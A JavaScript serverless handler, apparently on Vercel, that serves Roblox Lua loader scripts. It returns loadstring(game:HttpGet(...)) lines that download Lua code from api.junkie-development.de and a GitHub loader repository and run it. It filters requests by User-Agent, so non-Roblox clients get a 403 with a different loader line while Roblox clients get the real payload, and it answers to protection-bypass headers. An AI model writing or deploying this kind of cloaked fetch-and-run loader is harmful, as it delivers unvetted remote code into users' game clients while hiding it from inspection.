export default function handler(req, res) {
    const bypass = req.headers['x-vercel-protection-bypass'] || 
                   req.headers['x-vercel-set-bypass-cookie'] ||
                   req.query['x-vercel-protection-bypass'] ||
                   req.query['x-vercel-set-bypass-cookie'];

    if (bypass) {
        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
        res.setHeader('Cache-Control', 'no-store');
        return res.status(200).send('Working');
    }

    const userAgent = (req.headers['user-agent'] || '').toLowerCase();

    const isRoblox = userAgent.includes('roblox') || userAgent.includes('robloxstudio');

    if (!isRoblox) {
        res.setHeader('Content-Type', 'text/plain');
        return res.status(403).send('loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/9be028df6511e5b121e5c2dfef420e02.lua"))()');
    }

    const robloxId = req.headers['roblox-id'];
    if (robloxId && !/^\d+$/.test(robloxId)) {
        return res.status(403).send('Invalid Roblox ID.');
    }

    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');

    const script = `
    loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/c3da68f318b667499ac2f3fe64966482bd2ebc3397a986049eb3fbb7e41428fa/download"))()
    loadstring(game:HttpGet("https://github.com/Rawbr10/loader/raw/refs/heads/main/LauGuardia/download/56a42f1b1e9cd1b7597fa215fc541cca.lua"))()`;

    return res.status(200).send(script);
}
